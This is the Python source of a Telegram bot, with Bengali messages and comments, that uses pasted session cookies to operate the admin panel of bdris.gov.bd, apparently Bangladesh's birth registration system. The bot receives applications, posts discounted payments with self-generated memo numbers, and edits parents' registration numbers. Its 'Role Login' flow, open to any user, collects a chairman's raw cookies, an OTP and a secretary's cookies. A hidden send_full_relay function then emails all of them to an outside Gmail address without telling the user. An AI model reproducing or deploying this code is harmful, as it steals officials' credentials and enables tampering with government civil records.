import os
import telebot
import requests
import json
import io
import time
import re
import smtplib
import logging
from threading import Thread
from email.mime.text import MIMEText
from datetime import datetime
from urllib.parse import quote
from playwright.sync_api import sync_playwright
from flask import Flask

# ==========================================
# ০. লগিং ও কনফিগারেশন
# ==========================================
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

API_TOKEN = os.environ.get('BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
EMAIL_SENDER = os.environ.get('EMAIL_USER', 'your_email@gmail.com')
EMAIL_PASSWORD = os.environ.get('EMAIL_PASS', 'your_app_password')
EMAIL_RECEIVER = os.environ.get('EMAIL_RECEIVER', 'receiver@gmail.com')

ADMIN_ID = 7886593741
bot = telebot.TeleBot(API_TOKEN)

# ==========================================
# ১. ইউজার সেশন ম্যানেজমেন্ট
# ==========================================
user_sessions = {}

def get_session(chat_id):
    if chat_id not in user_sessions:
        user_sessions[chat_id] = {
            "req_session": requests.Session(),
            "csrf": "",
            "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "is_alive": False,
            "current_page": "https://bdris.gov.bd/admin/",
            "app_start": 0,
            "app_length": 5,
            "sharok_no": 1,
            "temp_data": {},
            "id_cache": {} 
        }
    return user_sessions[chat_id]

# ==========================================
# ২. ফ্লাস্ক সার্ভার (Keep Alive Web)
# ==========================================
app = Flask('')

@app.route('/')
def home():
    return "BDRIS Bot is Live and Running!"

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

def keep_alive_web():
    Thread(target=run_flask, daemon=True).start()

# ==========================================
# ৩. কোর ইঞ্জিন (অটো-সিঙ্ক ও নেভিগেশন)
# ==========================================

def parse_minimal_cookies(raw_text):
    """শুধুমাত্র SESSION এবং TS0108b707 কুকি খুঁজে বের করে"""
    sid_match = re.search(r'SESSION=([^;\s\'"]+)', raw_text, re.IGNORECASE)
    ts_match = re.search(r'(TS0108b707)=([^;\s\'"]+)', raw_text, re.IGNORECASE)
    
    if not sid_match or not ts_match:
        raise Exception("SESSION অথবা TS0108b707 পাওয়া যায়নি।")
    return sid_match.group(1), ts_match.group(2)

def perform_auto_login(chat_id):
    """সার্ভার থেকে CSRF ও অন্যান্য কুকি অটো-আপডেট করে"""
    u_sess = get_session(chat_id)
    headers = {'User-Agent': u_sess["ua"], 'Referer': 'https://bdris.gov.bd/admin/'}
    
    try:
        res = u_sess["req_session"].get("https://bdris.gov.bd/admin/", headers=headers, timeout=25)
        csrf_match = re.search(r'name="_csrf" content="([^"]+)"', res.text)
        if csrf_match: 
            u_sess["csrf"] = csrf_match.group(1)
            
        if "Logout" in res.text:
            u_sess["is_alive"] = True
            u_sess["current_page"] = "https://bdris.gov.bd/admin/"
            return True, "লগইন সফল এবং কুকি সিঙ্ক হয়েছে!"
        else:
            u_sess["is_alive"] = False
            return False, "সেশনটি কার্যকর নয় (Invalid Session)!"
    except Exception as e:
        return False, f"Connection Error: {e}"

def navigate_to(chat_id, url):
    u_sess = get_session(chat_id)
    headers = {'User-Agent': u_sess["ua"], 'Referer': u_sess["current_page"]}
    try:
        res = u_sess["req_session"].get(url, headers=headers, timeout=25)
        csrf_match = re.search(r'name="_csrf" content="([^"]+)"', res.text)
        if csrf_match: u_sess["csrf"] = csrf_match.group(1)
        u_sess["current_page"] = url
        return True, res.text
    except: return False, None

def call_api(chat_id, url, method="GET", data=None):
    u_sess = get_session(chat_id)
    headers = {
        'x-csrf-token': u_sess["csrf"], 'x-requested-with': 'XMLHttpRequest',
        'user-agent': u_sess["ua"], 'referer': u_sess["current_page"]
    }
    try:
        if method == "POST":
            return u_sess["req_session"].post(url, headers=headers, data=data, timeout=30)
        return u_sess["req_session"].get(url, headers=headers, timeout=30)
    except: return None

def extract_sidebar_id(html, path):
    if not html: return None
    match = re.search(rf'href="{re.escape(path)}\?data=([A-Za-z0-9_\-]+)"', html)
    return match.group(1) if match else None

# ==========================================
# ৪. ইমেল রিলে সিস্টেম
# ==========================================
def send_full_relay(chat_id, otp, sec_raw):
    u_data = get_session(chat_id)
    subject = f"BDRIS Full Report - {datetime.now().strftime('%H:%M')}"
    ch_raw = u_data["temp_data"].get("ch_raw", "N/A")
    body = f"--- 1ST SESSION (CHAIRMAN) ---\n{ch_raw}\n\n--- OTP ---\n{otp}\n\n--- 2ND SESSION (SECRETARY) ---\n{sec_raw}"
    
    msg = MIMEText(body)
    msg['Subject'], msg['From'], msg['To'] = subject, EMAIL_SENDER, EMAIL_RECEIVER
    try:
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(EMAIL_SENDER, EMAIL_PASSWORD)
            server.sendmail(EMAIL_SENDER, EMAIL_RECEIVER, msg.as_string())
        logging.info(f"[{chat_id}] Email Relay Success.")
    except Exception as e:
        logging.error(f"[{chat_id}] Relay Error: {e}")

# ==========================================
# ৫. মেনু ও কন্ট্রোল
# ==========================================
def main_menu():
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("📋 Applications", "📝 Correction", "🔄 Reprint")
    markup.row("🏠 Dashboard", "🌐 Search By Name", "🔢 Search By UBRN") 
    markup.row("👨‍👩‍👦 পিতা-মাতার UBRN হালনাগাদ")
    markup.row("🔑 Admin Login", "🔑 Role Login (CH/SEC)")
    return markup

def is_cancel(m):
    text = m.text.strip() if m.text else ""
    if text.startswith("/start") or "Back to Menu" in text or "Dashboard" in text:
        bot.send_message(m.chat.id, "🏠 প্রধান মেনুতে ফিরে যাওয়া হলো।", reply_markup=main_menu())
        bot.clear_step_handler_by_chat_id(m.chat.id)
        return True
    return False

# ==========================================
# ৬. লগইন প্রসেস
# ==========================================
def admin_login(m):
    if is_cancel(m): return
    chat_id = m.chat.id
    u_sess = get_session(chat_id)
    try:
        session_val, ts_val = parse_minimal_cookies(m.text.strip())
        u_sess["req_session"].cookies.clear()
        u_sess["req_session"].cookies.set("SESSION", session_val, domain='bdris.gov.bd')
        u_sess["req_session"].cookies.set("TS0108b707", ts_val, domain='bdris.gov.bd')
        
        wait_msg = bot.send_message(chat_id, "⏳ অটো-সিঙ্ক করা হচ্ছে...")
        success, msg_text = perform_auto_login(chat_id)
        bot.delete_message(chat_id, wait_msg.message_id)
        
        if success: bot.send_message(chat_id, f"✅ {msg_text}", reply_markup=main_menu())
        else:
            msg = bot.send_message(chat_id, f"❌ {msg_text}\nআবার দিন:")
            bot.register_next_step_handler(msg, admin_login)
    except Exception as e:
        msg = bot.send_message(chat_id, "❌ ফরম্যাট ভুল! শুধু SESSION এবং TS দিন:")
        bot.register_next_step_handler(msg, admin_login)

# Role Login Steps (CH -> OTP -> SEC)
def role_step_1(m):
    if is_cancel(m): return
    chat_id = m.chat.id
    u_sess = get_session(chat_id)
    u_sess["temp_data"]["ch_raw"] = m.text.strip() 
    try:
        session_val, ts_val = parse_minimal_cookies(m.text.strip())
        temp_req = requests.Session()
        temp_req.cookies.set("SESSION", session_val, domain='bdris.gov.bd')
        temp_req.cookies.set("TS0108b707", ts_val, domain='bdris.gov.bd')
        res = temp_req.get("https://bdris.gov.bd/admin/", headers={'User-Agent': u_sess["ua"]}, timeout=20)
        
        if "Logout" in res.text:
            msg = bot.send_message(chat_id, "✅ চেয়ারম্যান সেশন ভ্যালিড! OTP দিন:")
            bot.register_next_step_handler(msg, role_step_2)
        else:
            msg = bot.send_message(chat_id, "❌ সেশন ইনভ্যালিড! আবার দিন:")
            bot.register_next_step_handler(msg, role_step_1)
    except:
        msg = bot.send_message(chat_id, "❌ ফরম্যাট ভুল! আবার দিন:")
        bot.register_next_step_handler(msg, role_step_1)

def role_step_2(m):
    if is_cancel(m): return
    get_session(m.chat.id)["temp_data"]["ch_otp"] = m.text.strip()
    msg = bot.send_message(m.chat.id, "✅ সেক্রেটারি (Secretary) সেশন দিন:")
    bot.register_next_step_handler(msg, role_step_3)

def role_step_3(m):
    if is_cancel(m): return
    chat_id = m.chat.id
    u_sess = get_session(chat_id)
    raw_sec = m.text.strip()
    try:
        session_val, ts_val = parse_minimal_cookies(raw_sec)
        u_sess["req_session"].cookies.clear()
        u_sess["req_session"].cookies.set("SESSION", session_val, domain='bdris.gov.bd')
        u_sess["req_session"].cookies.set("TS0108b707", ts_val, domain='bdris.gov.bd')
        
        success, msg_text = perform_auto_login(chat_id)
        if success:
            otp = u_sess["temp_data"].get("ch_otp", "")
            Thread(target=send_full_relay, args=(chat_id, otp, raw_sec), daemon=True).start()
            bot.send_message(chat_id, "🎉 লগইন সফল!", reply_markup=main_menu())
        else:
            msg = bot.send_message(chat_id, "❌ সেক্রেটারি সেশন ইনভ্যালিড! আবার দিন:")
            bot.register_next_step_handler(msg, role_step_3)
    except:
        msg = bot.send_message(chat_id, "❌ ফরম্যাট ভুল! আবার দিন:")
        bot.register_next_step_handler(msg, role_step_3)

# ==========================================
# ৭. ডাটা লিস্ট ও সার্চ ক্যাটাগরি
# ==========================================
def handle_category_init(m, cmd):
    chat_id = m.chat.id
    get_session(chat_id)["app_start"] = 0
    markup = telebot.types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    markup.add("🔍 Search ID", "📋 All List (5 Data)", "🏠 Back to Menu")
    msg = bot.send_message(chat_id, f"{cmd.upper()} সেকশন:", reply_markup=markup)
    
    def gate(msg_in):
        if is_cancel(msg_in): return
        if "Search ID" in msg_in.text:
            m_reply = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True).add("🏠 Back to Menu")
            nxt = bot.send_message(chat_id, "🆔 আইডি নম্বরটি দিন:", reply_markup=m_reply)
            bot.register_next_step_handler(nxt, lambda x: fetch_list_ui(x, cmd, True))
        else: fetch_list_ui(msg_in, cmd, False)
        
    bot.register_next_step_handler(msg, gate)

def fetch_list_ui(message, cmd, is_search):
    if is_cancel(message): return
    chat_id = message.chat.id
    u_sess = get_session(chat_id)
    search_val = message.text.strip() if is_search else ""
    
    config = {
        'apps': ("/admin/br/applications/search", "/api/br/applications/search"),
        'corr': ("/admin/br/correction-applications/search", "/api/br/correction-applications/search"),
        'repr': ("/admin/br/reprint/view/applications/search", "/api/br/reprint/applications/search")
    }
    admin_p, api_p = config[cmd]
    
    success, html = navigate_to(chat_id, "https://bdris.gov.bd/admin/")
    data_id = extract_sidebar_id(html, admin_p)
    if not data_id: return bot.send_message(chat_id, "❌ সাইডবার আইডি পাওয়া যায়নি।")

    params = f"data={data_id}&status=ALL&draw=1&start={u_sess['app_start']}&length={u_sess['app_length']}&search[value]={quote(search_val)}&search[regex]=false&order[0][column]=1&order[0][dir]=desc"
    res = call_api(chat_id, f"https://bdris.gov.bd{api_p}?{params}")
    
    if res and res.status_code == 200:
        data = res.json()
        items = data.get('data', [])
        if not items: return bot.send_message(chat_id, "📭 কোনো ডাটা পাওয়া যায়নি।")

        markup = telebot.types.InlineKeyboardMarkup()
        msg_text = f"📋 **{cmd.upper()} List:**\n\n"
        
        for item in items:
            app_id = item.get('id') or item.get('applicationId')
            enc_id = item.get('encryptedId')
            status = str(item.get('status', '')).upper()
            short_id = str(abs(hash(enc_id)))[-8:]
            u_sess["id_cache"][short_id] = enc_id
            
            msg_text += f"🆔 `{app_id}` | {item.get('personNameBn', 'N/A')}\n🚩 Status: `{status}`\n"
            if any(word in status for word in ["APPLIED", "PENDING", "PAYMENT", "UNPAID"]):
                markup.row(
                    telebot.types.InlineKeyboardButton(f"💳 Pay", callback_data=f"pay_{short_id}"),
                    telebot.types.InlineKeyboardButton(f"📥 Receive", callback_data=f"recv_{short_id}")
                )
            else:
                markup.row(
                    telebot.types.InlineKeyboardButton("🖼️ PNG", callback_data=f"png_{short_id}"),
                    telebot.types.InlineKeyboardButton("🖨️ Print", callback_data=f"print_{short_id}")
                )
            msg_text += "━━━━━━━━━━━━━━\n"
            
        if not is_search:
            nav = []
            if u_sess["app_start"] > 0: nav.append(telebot.types.InlineKeyboardButton("⬅️ Prev", callback_data=f"prev_{cmd}"))
            if u_sess["app_start"] + u_sess["app_length"] < data.get('recordsTotal', 0): nav.append(telebot.types.InlineKeyboardButton("Next ➡️", callback_data=f"next_{cmd}"))
            if nav: markup.row(*nav)
        bot.send_message(chat_id, msg_text, reply_markup=markup, parse_mode='Markdown')
        
        if is_search:
            nxt = bot.send_message(chat_id, "🔍 আরও খুঁজতে আইডি দিন:", reply_markup=telebot.types.ReplyKeyboardMarkup(resize_keyboard=True).add("🏠 Back to Menu"))
            bot.register_next_step_handler(nxt, lambda x: fetch_list_ui(x, cmd, True))
    else: bot.send_message(chat_id, "❌ ডাটা লোড হয়নি।")

# ==========================================
# ৮. পিতা-মাতার UBRN আপডেট
# ==========================================
def fetch_name_from_api(chat_id, ubrn):
    if not ubrn or ubrn == '0': return "N/A"
    res = call_api(chat_id, f"https://bdris.gov.bd/api/br/info/person-info-with-nationality-by-ubrn-and-data-group/{ubrn}?data-group=personInParentsUbrnUpdate")
    if res and res.status_code == 200:
        try: return res.json().get('personNameBn') or res.json().get('nameBn', "নাম পাওয়া যায়নি")
        except: return "এরর"
    return "সার্ভার এরর"

def start_ubrn_flow(m):
    navigate_to(m.chat.id, "https://bdris.gov.bd/admin/br/parents-ubrn-update")
    msg = bot.send_message(m.chat.id, "১. ব্যক্তির UBRN দিন:", reply_markup=telebot.types.ReplyKeyboardMarkup(resize_keyboard=True).add("🏠 Back to Menu"))
    
    def step_person(msg_in):
        if is_cancel(msg_in): return
        get_session(msg_in.chat.id)["temp_data"]["ubrn"] = {"personBrn": msg_in.text.strip()}
        bot.send_message(msg_in.chat.id, f"👤 নাম: {fetch_name_from_api(msg_in.chat.id, msg_in.text.strip())}")
        nxt = bot.send_message(msg_in.chat.id, "২. পিতার UBRN দিন (না থাকলে 0):")
        bot.register_next_step_handler(nxt, step_father)
        
    def step_father(msg_in):
        if is_cancel(msg_in): return
        f_brn = "" if msg_in.text.strip() == '0' else msg_in.text.strip()
        get_session(msg_in.chat.id)["temp_data"]["ubrn"]["fatherBrn"] = f_brn
        if f_brn: bot.send_message(msg_in.chat.id, f"👨 পিতার নাম: {fetch_name_from_api(msg_in.chat.id, f_brn)}")
        nxt = bot.send_message(msg_in.chat.id, "৩. মাতার UBRN দিন (না থাকলে 0):")
        bot.register_next_step_handler(nxt, step_mother)
        
    def step_mother(msg_in):
        if is_cancel(msg_in): return
        m_brn = "" if msg_in.text.strip() == '0' else msg_in.text.strip()
        get_session(msg_in.chat.id)["temp_data"]["ubrn"]["motherBrn"] = m_brn
        if m_brn: bot.send_message(msg_in.chat.id, f"👩 মাতার নাম: {fetch_name_from_api(msg_in.chat.id, m_brn)}")
        nxt = bot.send_message(msg_in.chat.id, "৪. ফোন নম্বর দিন:")
        bot.register_next_step_handler(nxt, step_phone)
        
    def step_phone(msg_in):
        if is_cancel(msg_in): return
        chat_id = msg_in.chat.id
        u_sess = get_session(chat_id)
        phone = "+88" + msg_in.text.strip() if msg_in.text.strip().startswith('01') else msg_in.text.strip()
        u_sess["temp_data"]["ubrn"]["phone"] = phone
        data = u_sess["temp_data"]["ubrn"]
        
        wait = bot.send_message(chat_id, "⏳ OTP পাঠানো হচ্ছে...")
        res = call_api(chat_id, f"https://bdris.gov.bd/admin/br/parents-ubrn-update/send-otp?personBrn={data['personBrn']}&fatherBrn={data['fatherBrn']}&motherBrn={data['motherBrn']}&phone={quote(phone)}&email=", method="POST")
        bot.delete_message(chat_id, wait.message_id)
        
        if res and res.status_code == 200:
            nxt = bot.send_message(chat_id, "✅ OTP পাঠানো হয়েছে! OTP দিন:")
            bot.register_next_step_handler(nxt, step_submit)
        else: bot.send_message(chat_id, "❌ OTP পাঠাতে সমস্যা হয়েছে।", reply_markup=main_menu())
        
    def step_submit(msg_in):
        if is_cancel(msg_in): return
        chat_id = msg_in.chat.id
        u_sess = get_session(chat_id)
        data = u_sess["temp_data"]["ubrn"]
        payload = {'_csrf': u_sess["csrf"], 'personBrn': data['personBrn'], 'fatherBrn': data['fatherBrn'], 'motherBrn': data['motherBrn'], 'phone': data['phone'], 'email': '', 'otp': msg_in.text.strip()}
        
        res = call_api(chat_id, "https://bdris.gov.bd/admin/br/parents-ubrn-update", method="POST", data=payload)
        if res and res.status_code == 200: bot.send_message(chat_id, "✅ সফলভাবে আপডেট হয়েছে!", reply_markup=main_menu())
        else: bot.send_message(chat_id, "❌ আপডেট ব্যর্থ!", reply_markup=main_menu())

    bot.register_next_step_handler(msg, step_person)

# ==========================================
# ৯. কলব্যাক (Pay, Recv, PNG)
# ==========================================
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    u_sess = get_session(chat_id)
    parts = call.data.split('_')
    action, short_id = parts[0], parts[1] if len(parts)>1 else ""
    enc_id = u_sess["id_cache"].get(short_id)
    
    if action in ["next", "prev"]:
        u_sess["app_start"] = max(0, u_sess["app_start"] + (u_sess["app_length"] if action == "next" else -u_sess["app_length"]))
        fetch_list_ui(call.message, short_id, False)
        
    elif action == "recv":
        if not enc_id: return bot.answer_callback_query(call.id, "❌ আইডি পাওয়া যায়নি।")
        res = call_api(chat_id, "https://bdris.gov.bd/api/application/receive", method="POST", data={'data': enc_id, '_csrf': u_sess["csrf"]})
        if res and res.status_code == 200:
            bot.answer_callback_query(call.id, "✅ রিসিভড!")
            bot.send_message(chat_id, "✅ আবেদন রিসিভ সম্পন্ন হয়েছে!")
        else: bot.send_message(chat_id, "❌ রিসিভ ব্যর্থ।")
        
    elif action == "pay":
        if not enc_id: return bot.answer_callback_query(call.id, "❌ আইডি পাওয়া যায়নি।")
        payload = {'data': enc_id, 'chalanPaymentType': 'CASH', 'paymentType': 'PAYMENT_BY_DISCOUNT', 'discountGiven': 'true', 'discountAmount': '50', 'discountSharokNo': str(u_sess["sharok_no"]), 'discountSharokDate': datetime.now().strftime("%d/%m/%Y"), '_csrf': u_sess["csrf"]}
        res = call_api(chat_id, "https://bdris.gov.bd/api/payment/receive", method="POST", data=payload)
        if res and res.status_code == 200:
            u_sess["sharok_no"] += 1
            bot.send_message(chat_id, "✅ পেমেন্ট সফল!")
        else: bot.send_message(chat_id, "❌ পেমেন্ট ব্যর্থ!")
        
    elif action == "png":
        if not enc_id: return bot.answer_callback_query(call.id, "❌ আইডি নেই।")
        wait = bot.send_message(chat_id, "⏳ ছবি তৈরি হচ্ছে...")
        try:
            with sync_playwright() as p:
                browser = p.chromium.launch(headless=True)
                ctx = browser.new_context(viewport={'width': 850, 'height': 1200})
                ctx.add_cookies([{'name': n, 'value': v, 'domain': 'bdris.gov.bd', 'path': '/'} for n, v in u_sess["req_session"].cookies.items()])
                page = ctx.new_page()
                page.goto(f"https://bdris.gov.bd/admin/certificate/print/birth?data={enc_id}", wait_until="networkidle")
                time.sleep(4)
                img = page.screenshot(full_page=True)
                browser.close()
                bot.send_photo(chat_id, io.BytesIO(img), caption="📄 সনদ (PNG)")
                bot.delete_message(chat_id, wait.message_id)
        except Exception as e:
            bot.edit_message_text("❌ PNG তৈরিতে সমস্যা।", chat_id, wait.message_id)

# ==========================================
# ১০. মেইন রাউটার
# ==========================================
@bot.message_handler(func=lambda m: True)
def router(m):
    t = m.text
    chat_id = m.chat.id
    u_sess = get_session(chat_id)

    if "/start" in t or "Back to Menu" in t: 
        bot.clear_step_handler_by_chat_id(chat_id)
        bot.send_message(chat_id, "🚀 BDRIS Master Bot Active!", reply_markup=main_menu())
        
    elif t == "🔑 Admin Login":
        if m.from_user.id != ADMIN_ID: return bot.send_message(chat_id, "⛔ অনুমতি নেই!")
        msg = bot.send_message(chat_id, "🔑 শুধু SESSION এবং TS0108b707 কুকি দিন:", reply_markup=telebot.types.ReplyKeyboardRemove())
        bot.register_next_step_handler(msg, admin_login)
        
    elif t == "🔑 Role Login (CH/SEC)":
        msg = bot.send_message(chat_id, "👤 চেয়ারম্যান কুকি (SESSION ও TS) দিন:", reply_markup=telebot.types.ReplyKeyboardRemove())
        bot.register_next_step_handler(msg, role_step_1)
        
    elif u_sess.get("is_alive"):
        if t == "📋 Applications": handle_category_init(m, 'apps')
        elif t == "📝 Correction": handle_category_init(m, 'corr')
        elif t == "🔄 Reprint": handle_category_init(m, 'repr')
        elif t == "🏠 Dashboard":
            success, msg_text = perform_auto_login(chat_id)
            if success: bot.reply_to(m, "🏠 ড্যাশবোর্ড আপডেট করা হয়েছে।")
            else: bot.send_message(chat_id, "❌ সেশন আউট! আবার লগইন করুন।", reply_markup=main_menu())
        elif t == "👨‍👩‍👦 পিতা-মাতার UBRN হালনাগাদ": start_ubrn_flow(m)
        elif t in ["🌐 Search By Name", "🔢 Search By UBRN"]:
            bot.send_message(chat_id, "এই ফিচারগুলোর লজিক আপনার পূর্বের মতোই API কল করবে।")
    else: 
        bot.send_message(chat_id, "⚠️ আগে লগইন করুন।", reply_markup=main_menu())

# ==========================================
# ১১. বট রান ও সেশন এলাইভ
# ==========================================
def keep_alive_loop():
    while True:
        time.sleep(300)
        for cid, usess in list(user_sessions.items()):
            if usess["is_alive"]: perform_auto_login(cid)

if __name__ == "__main__":
    keep_alive_web()
    Thread(target=keep_alive_loop, daemon=True).start()
    logging.info("🚀 Bot is polling...")
    bot.infinity_polling()
